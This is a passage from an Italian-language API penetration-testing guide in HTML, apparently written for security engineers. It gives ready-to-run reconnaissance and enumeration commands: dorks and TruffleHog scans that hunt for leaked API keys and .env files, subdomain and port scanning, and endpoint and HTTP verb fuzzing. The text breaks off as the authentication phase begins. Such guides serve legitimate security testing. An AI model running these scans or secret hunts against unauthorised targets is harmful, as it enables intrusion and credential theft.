<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>API Pentest — Complete Walkthrough</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0a0c0f;
    --bg2: #0f1115;
    --bg3: #141820;
    --border: #1e2530;
    --border2: #252e3d;
    --accent: #00d4ff;
    --accent2: #ff3e5e;
    --accent3: #39ff14;
    --accent4: #ffbe0b;
    --accent5: #bc5af5;
    --text: #c8d6e5;
    --text2: #7a90a8;
    --text3: #4a5f72;
    --glow: 0 0 20px rgba(0,212,255,0.15);
    --glow2: 0 0 20px rgba(255,62,94,0.15);
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Syne', sans-serif;
    line-height: 1.6;
    overflow-x: hidden;
  }

  /* Scanlines overlay */
  body::before {
    content: '';
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
    pointer-events: none;
    z-index: 1000;
  }

  /* Animated grid background */
  .grid-bg {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background-image:
      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  .container {
    max-width: 1100px;
    margin: 0 auto;
    padding: 0 24px;
    position: relative;
    z-index: 1;
  }

  /* ─── HEADER ─── */
  header {
    padding: 60px 0 40px;
    border-bottom: 1px solid var(--border);
    position: relative;
  }

  .header-tag {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: var(--accent3);
    letter-spacing: 3px;
    text-transform: uppercase;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .header-tag::before {
    content: '';
    width: 24px;
    height: 1px;
    background: var(--accent3);
  }

  h1 {
    font-size: clamp(32px, 5vw, 52px);
    font-weight: 800;
    line-height: 1.1;
    letter-spacing: -1px;
    margin-bottom: 16px;
  }

  h1 .highlight {
    color: var(--accent);
    position: relative;
  }

  h1 .highlight2 { color: var(--accent2); }

  .header-meta {
    display: flex;
    gap: 24px;
    margin-top: 24px;
    flex-wrap: wrap;
  }

  .meta-pill {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    padding: 5px 12px;
    border-radius: 2px;
    border: 1px solid;
    letter-spacing: 1px;
  }

  .pill-red { border-color: var(--accent2); color: var(--accent2); background: rgba(255,62,94,0.08); }
  .pill-blue { border-color: var(--accent); color: var(--accent); background: rgba(0,212,255,0.08); }
  .pill-green { border-color: var(--accent3); color: var(--accent3); background: rgba(57,255,20,0.08); }

  /* ─── OWASP BANNER ─── */
  .owasp-bar {
    background: var(--bg3);
    border: 1px solid var(--border2);
    border-left: 3px solid var(--accent4);
    padding: 16px 20px;
    margin: 32px 0;
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    color: var(--text2);
    line-height: 1.8;
  }

  .owasp-bar strong { color: var(--accent4); }

  .owasp-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
    gap: 6px;
    margin-top: 10px;
  }

  .owasp-item {
    padding: 5px 8px;
    background: var(--bg2);
    border: 1px solid var(--border);
    border-radius: 2px;
    font-size: 11px;
    color: var(--text3);
    transition: all 0.2s;
    cursor: default;
  }

  .owasp-item:hover { border-color: var(--accent4); color: var(--accent4); }
  .owasp-item span { color: var(--accent4); margin-right: 6px; font-weight: 700; }

  /* ─── NAV ─── */
  .nav-sticky {
    position: sticky;
    top: 0;
    background: rgba(10,12,15,0.95);
    backdrop-filter: blur(12px);
    border-bottom: 1px solid var(--border);
    padding: 12px 0;
    z-index: 100;
  }

  .nav-inner {
    display: flex;
    gap: 4px;
    overflow-x: auto;
    scrollbar-width: none;
  }

  .nav-inner::-webkit-scrollbar { display: none; }

  .nav-btn {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    padding: 6px 14px;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text2);
    cursor: pointer;
    white-space: nowrap;
    border-radius: 2px;
    transition: all 0.2s;
    letter-spacing: 0.5px;
  }

  .nav-btn:hover, .nav-btn.active {
    background: var(--accent);
    border-color: var(--accent);
    color: var(--bg);
  }

  /* ─── PHASES ─── */
  .phase {
    padding: 56px 0;
    border-bottom: 1px solid var(--border);
    opacity: 0;
    transform: translateY(30px);
    transition: opacity 0.5s ease, transform 0.5s ease;
  }

  .phase.visible {
    opacity: 1;
    transform: translateY(0);
  }

  .phase-header {
    display: flex;
    align-items: flex-start;
    gap: 20px;
    margin-bottom: 32px;
  }

  .phase-number {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: var(--bg);
    background: var(--accent);
    padding: 4px 10px;
    font-weight: 700;
    letter-spacing: 2px;
    flex-shrink: 0;
    margin-top: 4px;
  }

  .phase-number.red { background: var(--accent2); }
  .phase-number.green { background: var(--accent3); color: var(--bg); }
  .phase-number.yellow { background: var(--accent4); color: var(--bg); }
  .phase-number.purple { background: var(--accent5); }
  .phase-number.orange { background: #ff7043; }
  .phase-number.teal { background: #00bfa5; }

  .phase-title {
    font-size: clamp(20px, 3vw, 28px);
    font-weight: 800;
    letter-spacing: -0.5px;
    line-height: 1.2;
  }

  .phase-subtitle {
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    color: var(--text2);
    margin-top: 4px;
  }

  /* ─── DESCRIPTION BLOCK ─── */
  .description {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-left: 3px solid var(--accent);
    padding: 20px 24px;
    margin-bottom: 28px;
    font-size: 14px;
    color: var(--text2);
    line-height: 1.8;
  }

  .description.red { border-left-color: var(--accent2); }
  .description.green { border-left-color: var(--accent3); }
  .description.yellow { border-left-color: var(--accent4); }
  .description.purple { border-left-color: var(--accent5); }
  .description.orange { border-left-color: #ff7043; }
  .description.teal { border-left-color: #00bfa5; }

  .description p + p { margin-top: 12px; }
  .description strong { color: var(--text); }

  /* ─── TEST CARD ─── */
  .test-grid {
    display: grid;
    gap: 16px;
    margin-bottom: 28px;
  }

  .test-card {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-radius: 2px;
    overflow: hidden;
    transition: border-color 0.2s;
  }

  .test-card:hover { border-color: var(--border2); }

  .test-card-header {
    padding: 14px 18px;
    background: var(--bg3);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
  }

  .test-name {
    font-weight: 700;
    font-size: 14px;
    color: var(--text);
  }

  .test-severity {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    padding: 3px 8px;
    border-radius: 2px;
    letter-spacing: 1px;
    font-weight: 700;
    flex-shrink: 0;
  }

  .sev-critical { background: rgba(255,62,94,0.15); color: var(--accent2); border: 1px solid rgba(255,62,94,0.3); }
  .sev-high { background: rgba(255,112,0,0.15); color: #ff7000; border: 1px solid rgba(255,112,0,0.3); }
  .sev-medium { background: rgba(255,190,11,0.15); color: var(--accent4); border: 1px solid rgba(255,190,11,0.3); }
  .sev-info { background: rgba(0,212,255,0.1); color: var(--accent); border: 1px solid rgba(0,212,255,0.2); }

  .test-card-body { padding: 16px 18px; }

  .test-desc {
    font-size: 13px;
    color: var(--text2);
    margin-bottom: 14px;
    line-height: 1.7;
  }

  /* ─── TOOL BADGES ─── */
  .tools-row {
    display: flex;
    gap: 6px;
    flex-wrap: wrap;
    margin-bottom: 14px;
  }

  .tool-badge {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    padding: 4px 10px;
    background: var(--bg3);
    border: 1px solid var(--border2);
    color: var(--accent);
    border-radius: 2px;
    cursor: default;
    transition: all 0.15s;
  }

  .tool-badge:hover {
    background: rgba(0,212,255,0.1);
    border-color: var(--accent);
  }

  /* ─── CODE BLOCK ─── */
  .code-wrap {
    position: relative;
    margin-top: 8px;
  }

  .code-label {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    color: var(--text3);
    letter-spacing: 2px;
    text-transform: uppercase;
    margin-bottom: 6px;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }

  .copy-btn {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    padding: 3px 10px;
    background: transparent;
    border: 1px solid var(--border2);
    color: var(--text3);
    cursor: pointer;
    transition: all 0.2s;
    border-radius: 2px;
    letter-spacing: 1px;
  }

  .copy-btn:hover { border-color: var(--accent3); color: var(--accent3); }
  .copy-btn.copied { border-color: var(--accent3); color: var(--accent3); }

  pre {
    background: #060809;
    border: 1px solid var(--border);
    padding: 16px 18px;
    overflow-x: auto;
    font-family: 'JetBrains Mono', monospace;
    font-size: 12.5px;
    line-height: 1.7;
    color: #abb2bf;
    border-radius: 2px;
    tab-size: 2;
  }

  pre::-webkit-scrollbar { height: 4px; }
  pre::-webkit-scrollbar-track { background: var(--bg); }
  pre::-webkit-scrollbar-thumb { background: var(--border2); }

  /* Syntax colors */
  .c-comment { color: #5c6370; font-style: italic; }
  .c-cmd { color: var(--accent3); }
  .c-flag { color: #e06c75; }
  .c-string { color: #98c379; }
  .c-var { color: #e5c07b; }
  .c-url { color: var(--accent); }
  .c-kw { color: #c678dd; }
  .c-num { color: #d19a66; }

  /* ─── TOOL TABLE ─── */
  .tool-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
    margin-top: 8px;
  }

  .tool-table th {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    letter-spacing: 2px;
    color: var(--text3);
    padding: 10px 14px;
    text-align: left;
    border-bottom: 1px solid var(--border2);
    background: var(--bg3);
    text-transform: uppercase;
  }

  .tool-table td {
    padding: 10px 14px;
    border-bottom: 1px solid var(--border);
    vertical-align: top;
    color: var(--text2);
    font-size: 13px;
  }

  .tool-table tr:hover td { background: var(--bg3); }

  .tool-table td:first-child {
    font-family: 'JetBrains Mono', monospace;
    color: var(--accent);
    font-size: 12px;
  }

  /* ─── ALERT BOX ─── */
  .alert {
    padding: 14px 18px;
    margin: 16px 0;
    border-radius: 2px;
    font-size: 13px;
    line-height: 1.7;
    display: flex;
    gap: 12px;
    align-items: flex-start;
  }

  .alert-warn {
    background: rgba(255,190,11,0.07);
    border: 1px solid rgba(255,190,11,0.2);
    color: #c8a800;
  }

  .alert-info {
    background: rgba(0,212,255,0.06);
    border: 1px solid rgba(0,212,255,0.15);
    color: var(--accent);
  }

  .alert-danger {
    background: rgba(255,62,94,0.07);
    border: 1px solid rgba(255,62,94,0.2);
    color: #cc2244;
  }

  .alert-icon {
    font-size: 16px;
    flex-shrink: 0;
    line-height: 1.5;
  }

  /* ─── CHECKLIST ─── */
  .checklist {
    list-style: none;
    display: grid;
    gap: 6px;
  }

  .checklist li {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    font-size: 13px;
    color: var(--text2);
    padding: 8px 12px;
    background: var(--bg2);
    border: 1px solid var(--border);
    border-radius: 2px;
  }

  .checklist li::before {
    content: '□';
    font-family: 'JetBrains Mono', monospace;
    color: var(--border2);
    flex-shrink: 0;
    margin-top: 1px;
  }

  /* ─── FOOTER ─── */
  footer {
    padding: 40px 0;
    border-top: 1px solid var(--border);
    text-align: center;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: var(--text3);
    letter-spacing: 1px;
  }

  footer span { color: var(--accent2); }

  /* ─── SCROLLBAR ─── */
  ::-webkit-scrollbar { width: 6px; }
  ::-webkit-scrollbar-track { background: var(--bg); }
  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }

  /* ─── ANIMATIONS ─── */
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
  }

  .blink {
    animation: pulse 1.5s ease infinite;
  }

  @keyframes slideIn {
    from { opacity: 0; transform: translateX(-10px); }
    to { opacity: 1; transform: translateX(0); }
  }

  .section-intro {
    margin-bottom: 28px;
  }
</style>
</head>
<body>

<div class="grid-bg"></div>

<!-- HEADER -->
<header>
  <div class="container">
    <div class="header-tag">
      <span>SECURITY ENGINEERING</span>
    </div>
    <h1>
      <span class="highlight">API Penetration</span><br>
      <span class="highlight2">Testing</span> — Full Walkthrough
    </h1>
    <div style="font-size:14px; color:var(--text2); margin-top:12px; max-width:600px; font-family:'JetBrains Mono',monospace; line-height:1.8;">
      Guida operativa completa per Security Engineer. Ogni fase include descrizione, obiettivi, tool e comandi pronti all'uso.
    </div>
    <div class="header-meta">
      <span class="meta-pill pill-red">⚠ USO AUTORIZZATO ESCLUSIVO</span>
      <span class="meta-pill pill-blue">OWASP API TOP 10</span>
      <span class="meta-pill pill-green">FREE TOOLS ONLY</span>
      <span class="meta-pill pill-blue">8 FASI</span>
    </div>
  </div>
</header>

<!-- OWASP TOP 10 -->
<div class="container">
  <div class="owasp-bar">
    <strong>OWASP API Security Top 10 — 2023</strong> — Riferimento per ogni fase del test
    <div class="owasp-grid" style="margin-top:10px;">
      <div class="owasp-item"><span>API1</span>BOLA / IDOR</div>
      <div class="owasp-item"><span>API2</span>Broken Auth</div>
      <div class="owasp-item"><span>API3</span>Object Property Auth</div>
      <div class="owasp-item"><span>API4</span>Unrestricted Resource</div>
      <div class="owasp-item"><span>API5</span>BFLA</div>
      <div class="owasp-item"><span>API6</span>Unrestricted Access</div>
      <div class="owasp-item"><span>API7</span>Server Side Request Forgery</div>
      <div class="owasp-item"><span>API8</span>Security Misconfiguration</div>
      <div class="owasp-item"><span>API9</span>Improper Inventory Mgmt</div>
      <div class="owasp-item"><span>API10</span>Unsafe API Consumption</div>
    </div>
  </div>
</div>

<!-- STICKY NAV -->
<nav class="nav-sticky">
  <div class="container">
    <div class="nav-inner">
      <button class="nav-btn active" onclick="gotoPhase('phase1')">01 · Recon</button>
      <button class="nav-btn" onclick="gotoPhase('phase2')">02 · Enumeration</button>
      <button class="nav-btn" onclick="gotoPhase('phase3')">03 · Auth Testing</button>
      <button class="nav-btn" onclick="gotoPhase('phase4')">04 · AuthZ / BOLA</button>
      <button class="nav-btn" onclick="gotoPhase('phase5')">05 · Input Validation</button>
      <button class="nav-btn" onclick="gotoPhase('phase6')">06 · Rate Limit & Logic</button>
      <button class="nav-btn" onclick="gotoPhase('phase7')">07 · GraphQL</button>
      <button class="nav-btn" onclick="gotoPhase('phase8')">08 · Reporting</button>
    </div>
  </div>
</nav>

<div class="container">

<!-- ════════════════════════════════ PHASE 1 ════════════════════════════════ -->
<section class="phase" id="phase1">
  <div class="phase-header">
    <div class="phase-number">01</div>
    <div>
      <div class="phase-title">Reconnaissance &amp; Information Gathering</div>
      <div class="phase-subtitle">passive · osint · attack surface mapping</div>
    </div>
  </div>

  <div class="description">
    <p>La fase di reconnaissance è il fondamento di ogni pentest efficace. L'obiettivo è mappare la <strong>superficie d'attacco</strong> senza inviare nemmeno una richiesta al target (passive recon), poi passare all'active recon in modo progressivo. Qui si raccolgono endpoint esposti, versioni API, credenziali leaked, chiavi API nei repo pubblici, e documentazione Swagger/OpenAPI che spesso espone l'intera struttura dell'applicazione.</p>
    <p>Un errore comune è saltare questa fase e partire subito con il fuzzing. La recon ben fatta riduce il rumore, evita falsi positivi e permette di costruire una <strong>wordlist target-specific</strong> molto più efficace di qualsiasi lista generica.</p>
    <p><strong>OWASP API9</strong> — Improper Inventory Management: spesso le organizzazioni non sanno quante versioni API hanno in produzione. La recon le rivela tutte.</p>
  </div>

  <div class="test-grid">

    <!-- TEST 1.1 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">1.1 — Google Dorks &amp; OSINT Passivo</span>
        <span class="test-severity sev-info">PASSIVE</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Ricerca di endpoint, file di configurazione, credenziali e documentazione API esposta involontariamente tramite motori di ricerca e archivi pubblici. Permette di trovare Swagger UI, file .env, chiavi API nel codice sorgente e versioni dimenticate.</div>
        <div class="tools-row">
          <span class="tool-badge">Google</span>
          <span class="tool-badge">Shodan CLI</span>
          <span class="tool-badge">FOFA</span>
          <span class="tool-badge">Censys</span>
          <span class="tool-badge">Wayback CDX</span>
          <span class="tool-badge">TruffleHog</span>
          <span class="tool-badge">Gitleaks</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>GOOGLE DORKS</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Trova Swagger UI esposta</span>
site:<span class="c-var">target.com</span> intitle:<span class="c-string">"swagger ui"</span>
site:<span class="c-var">target.com</span> inurl:<span class="c-string">"swagger.json"</span>
site:<span class="c-var">target.com</span> inurl:<span class="c-string">"api-docs"</span>

<span class="c-comment"># Trova endpoint e specifiche</span>
site:<span class="c-var">target.com</span> ext:<span class="c-string">json | yaml | yml</span>
site:<span class="c-var">target.com</span> inurl:<span class="c-string">"api/v1 | api/v2 | rest | graphql"</span>

<span class="c-comment"># File di configurazione e credenziali</span>
site:<span class="c-var">target.com</span> ext:<span class="c-string">env</span> intext:<span class="c-string">"API_KEY"</span>
site:github.com <span class="c-string">"target.com"</span> <span class="c-string">"api_key"</span>

<span class="c-comment"># Shodan CLI — server esposti</span>
<span class="c-cmd">shodan</span> <span class="c-flag">search</span> <span class="c-string">'hostname:target.com port:8080 product:"swagger"'</span>
<span class="c-cmd">shodan</span> <span class="c-flag">search</span> <span class="c-string">'http.title:"api" org:"target org"'</span></pre>
        </div>
        <div class="code-wrap" style="margin-top:12px;">
          <div class="code-label">
            <span>WAYBACK MACHINE — ENDPOINT STORICI</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Gau — recupera tutti gli URL indicizzati (incluse API)</span>
<span class="c-cmd">gau</span> <span class="c-var">target.com</span> | <span class="c-cmd">grep</span> <span class="c-flag">-E</span> <span class="c-string">"api|v[0-9]|rest|graphql|endpoint"</span> | <span class="c-cmd">sort</span> <span class="c-flag">-u</span>

<span class="c-comment"># Wayback CDX API — raw</span>
<span class="c-cmd">curl</span> <span class="c-string">"https://web.archive.org/cdx/search/cdx?url=*.target.com/api/*&output=text&fl=original&collapse=urlkey"</span>

<span class="c-comment"># Katana (ProjectDiscovery) — crawler veloce</span>
<span class="c-cmd">katana</span> <span class="c-flag">-u</span> <span class="c-url">https://target.com</span> <span class="c-flag">-d</span> <span class="c-num">5</span> <span class="c-flag">-jc</span> <span class="c-flag">-o</span> katana_out.txt</pre>
        </div>
        <div class="code-wrap" style="margin-top:12px;">
          <div class="code-label">
            <span>SECRET SCANNING — GIT REPOS</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># TruffleHog — scansiona repo GitHub pubblici del target</span>
<span class="c-cmd">trufflehog</span> github <span class="c-flag">--org</span>=<span class="c-var">target-org</span> <span class="c-flag">--only-verified</span>

<span class="c-comment"># Scansiona un singolo repo</span>
<span class="c-cmd">trufflehog</span> git <span class="c-url">https://github.com/target/repo</span> <span class="c-flag">--only-verified</span> <span class="c-flag">--json</span>

<span class="c-comment"># Gitleaks su repo clonato</span>
<span class="c-cmd">gitleaks</span> detect <span class="c-flag">--source</span> ./repo <span class="c-flag">--report-format</span> json <span class="c-flag">-r</span> secrets.json</pre>
        </div>
      </div>
    </div>

    <!-- TEST 1.2 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">1.2 — Subdomain &amp; API Endpoint Discovery</span>
        <span class="test-severity sev-info">ACTIVE-LIGHT</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Le API spesso risiedono su sottodomini dedicati (api.target.com, v2-api.target.com, dev-api.target.com). La subdomain enumeration espande enormemente la superficie d'attacco e spesso rivela ambienti staging/dev con sicurezza ridotta.</div>
        <div class="tools-row">
          <span class="tool-badge">Amass</span>
          <span class="tool-badge">Subfinder</span>
          <span class="tool-badge">dnsx</span>
          <span class="tool-badge">httpx</span>
          <span class="tool-badge">nmap</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>SUBDOMAIN ENUMERATION PIPELINE</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Step 1 — Enumera sottodomini</span>
<span class="c-cmd">subfinder</span> <span class="c-flag">-d</span> <span class="c-var">target.com</span> <span class="c-flag">-all</span> <span class="c-flag">-o</span> subs.txt
<span class="c-cmd">amass</span> enum <span class="c-flag">-passive</span> <span class="c-flag">-d</span> <span class="c-var">target.com</span> <span class="c-flag">-o</span> amass_subs.txt
<span class="c-cmd">cat</span> subs.txt amass_subs.txt | <span class="c-cmd">sort</span> <span class="c-flag">-u</span> > all_subs.txt

<span class="c-comment"># Step 2 — Risolvi solo i live</span>
<span class="c-cmd">cat</span> all_subs.txt | <span class="c-cmd">dnsx</span> <span class="c-flag">-silent</span> <span class="c-flag">-o</span> live_subs.txt

<span class="c-comment"># Step 3 — Filtra quelli con servizi HTTP/API</span>
<span class="c-cmd">cat</span> live_subs.txt | <span class="c-cmd">httpx</span> <span class="c-flag">-silent</span> <span class="c-flag">-title</span> <span class="c-flag">-status-code</span> \
  <span class="c-flag">-match-string</span> <span class="c-string">"api"</span> <span class="c-flag">-o</span> api_hosts.txt

<span class="c-comment"># Step 4 — Port scan sui target API</span>
<span class="c-cmd">nmap</span> <span class="c-flag">-sV</span> <span class="c-flag">-p</span> <span class="c-num">80,443,8080,8443,3000,5000,4000,9000</span> \
  <span class="c-flag">-iL</span> api_hosts.txt <span class="c-flag">-oN</span> nmap_apis.txt</pre>
        </div>
      </div>
    </div>

  </div><!-- end test-grid -->
</section>

<!-- ════════════════════════════════ PHASE 2 ════════════════════════════════ -->
<section class="phase" id="phase2">
  <div class="phase-header">
    <div class="phase-number green">02</div>
    <div>
      <div class="phase-title">API Enumeration &amp; Mapping</div>
      <div class="phase-subtitle">endpoint discovery · schema analysis · verb tampering</div>
    </div>
  </div>

  <div class="description green">
    <p>Con la lista di host ottenuta nella fase 1, ora si va in profondità a mappare tutti gli endpoint disponibili. Si cercano file di specifica (OpenAPI/Swagger), si effettua bruteforce degli endpoint con wordlist API-specific, si analizzano gli HTTP verb supportati e si identifica la tecnologia sottostante.</p>
    <p>Questa fase costruisce il <strong>target model</strong>: una mappa completa di tutti gli endpoint, metodi accettati, parametri e struttura dei dati. Strumenti come <strong>Kiterunner</strong> sono specificamente progettati per le API e usano wordlist basate su percorsi reali da centinaia di framework, risultando molto più efficaci dei brute forcer generici.</p>
    <p><strong>OWASP API9</strong> — Spesso si trovano versioni legacy (v1, v2, beta) attive con vulnerability non patchate che le versioni correnti non hanno più.</p>
  </div>

  <div class="test-grid">

    <!-- TEST 2.1 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">2.1 — Specifica OpenAPI / Swagger Discovery</span>
        <span class="test-severity sev-high">HIGH VALUE</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Se viene trovata la specifica OpenAPI, si ottiene gratis l'intera mappa dell'API: tutti gli endpoint, parametri, tipi di dato, autenticazione richiesta. È il golden ticket della fase di enumeration. Da convertire subito in una Postman/Insomnia collection per il testing.</div>
        <div class="tools-row">
          <span class="tool-badge">ffuf</span>
          <span class="tool-badge">feroxbuster</span>
          <span class="tool-badge">httpx</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>SPEC FILE BRUTEFORCE</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Lista path comuni per spec files</span>
<span class="c-cmd">cat</span> > spec_paths.txt <span class="c-string">&lt;&lt;EOF
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/api-docs/swagger.json
/v1/api-docs
/v2/api-docs
/v3/api-docs
/.well-known/openapi
/docs/swagger.json
/api/swagger
/api/openapi
/api/schema
/graphql
/graphiql
/playground
EOF</span>

<span class="c-comment"># ffuf — scan veloce</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-url">https://target.com/FUZZ</span> \
  <span class="c-flag">-w</span> spec_paths.txt \
  <span class="c-flag">-mc</span> <span class="c-num">200,201,301,302</span> \
  <span class="c-flag">-t</span> <span class="c-num">50</span> <span class="c-flag">-o</span> spec_found.json <span class="c-flag">-of</span> json

<span class="c-comment"># Con autenticazione</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-url">https://target.com/FUZZ</span> \
  <span class="c-flag">-w</span> spec_paths.txt \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer YOUR_TOKEN"</span> \
  <span class="c-flag">-mc</span> <span class="c-num">200,201</span></pre>
        </div>
      </div>
    </div>

    <!-- TEST 2.2 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">2.2 — Endpoint Bruteforce con Kiterunner</span>
        <span class="test-severity sev-high">HIGH VALUE</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Kiterunner è lo strumento state-of-the-art per la scoperta di endpoint API. A differenza di ffuf o gobuster, usa wordlist costruite da spec OpenAPI reali di centinaia di prodotti, invia richieste con body JSON strutturati e gestisce nativamente API REST. Rileva endpoint che i tool generici mancano completamente.</div>
        <div class="tools-row">
          <span class="tool-badge">Kiterunner</span>
          <span class="tool-badge">ffuf</span>
          <span class="tool-badge">feroxbuster</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>KITERUNNER — API ENDPOINT DISCOVERY</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Download wordlists (routes-large.kite ~150k routes API)</span>
<span class="c-cmd">wget</span> <span class="c-url">https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz</span>

<span class="c-comment"># Scan base</span>
<span class="c-cmd">kr</span> scan <span class="c-url">https://target.com</span> <span class="c-flag">-w</span> routes-large.kite \
  <span class="c-flag">--ignore-length</span>=<span class="c-num">34</span> \
  <span class="c-flag">-j</span> <span class="c-num">10</span> <span class="c-flag">-o</span> kr_results.txt

<span class="c-comment"># Con token di autenticazione</span>
<span class="c-cmd">kr</span> scan <span class="c-url">https://target.com</span> <span class="c-flag">-w</span> routes-large.kite \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer TOKEN"</span> \
  <span class="c-flag">--ignore-length</span>=<span class="c-num">34</span>

<span class="c-comment"># Brute force su più host</span>
<span class="c-cmd">kr</span> scan <span class="c-flag">-w</span> routes-large.kite \
  <span class="c-flag">--filename</span> api_hosts.txt \
  <span class="c-flag">--ignore-length</span>=<span class="c-num">34</span>

<span class="c-comment"># ffuf — parameter fuzzing</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-string">"https://target.com/api/v1/FUZZ"</span> \
  <span class="c-flag">-w</span> /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  <span class="c-flag">-mc</span> <span class="c-num">200,201,400,401,403,405</span> \
  <span class="c-flag">-fc</span> <span class="c-num">404</span> <span class="c-flag">-t</span> <span class="c-num">100</span></pre>
        </div>
      </div>
    </div>

    <!-- TEST 2.3 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">2.3 — HTTP Verb Tampering</span>
        <span class="test-severity sev-medium">MEDIUM</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Molte API implementano correttamente solo alcuni metodi HTTP lasciando gli altri non protetti. Un endpoint che blocca DELETE può essere vulnerabile a un metodo alternativo, o un endpoint GET-only potrebbe accettare POST con effetti collaterali. Testare tutti i verbi su ogni endpoint è essenziale.</div>
        <div class="tools-row">
          <span class="tool-badge">ffuf</span>
          <span class="tool-badge">Burp Suite</span>
          <span class="tool-badge">curl</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>VERB TAMPERING — CURL + FFUF</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Test manuale con curl su tutti i verbi</span>
<span class="c-kw">for</span> verb <span class="c-kw">in</span> GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; <span class="c-kw">do</span>
  <span class="c-cmd">echo</span> <span class="c-flag">-n</span> <span class="c-string">"[$verb] "</span>
  <span class="c-cmd">curl</span> <span class="c-flag">-s</span> <span class="c-flag">-o</span> /dev/null <span class="c-flag">-w</span> <span class="c-string">"%{http_code}\n"</span> \
    <span class="c-flag">-X</span> $verb <span class="c-url">https://target.com/api/v1/users</span> \
    <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer TOKEN"</span>
<span class="c-kw">done</span>

<span class="c-comment"># ffuf — verb fuzzing su endpoint specifico</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-url">https://target.com/api/v1/admin/users</span> \
  <span class="c-flag">-w</span> verbs.txt:VERB \
  <span class="c-flag">-X</span> VERB \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer USER_TOKEN"</span> \
  <span class="c-flag">-mc</span> <span class="c-num">200,201,204</span></pre>
        </div>
      </div>
    </div>

  </div>
</section>

<!-- ════════════════════════════════ PHASE 3 ════════════════════════════════ -->
<section class="phase" id="phase3">
  <div class="phase-header">
    <div class="phase-number red">03</div>
    <div>
      <div class="phase-title">Authentication Testing</div>
      <div class="phase-subtitle">jwt attacks · oauth flaws · credential security · token leakage</div>
    </div>
  </div>

  <div class="description red">
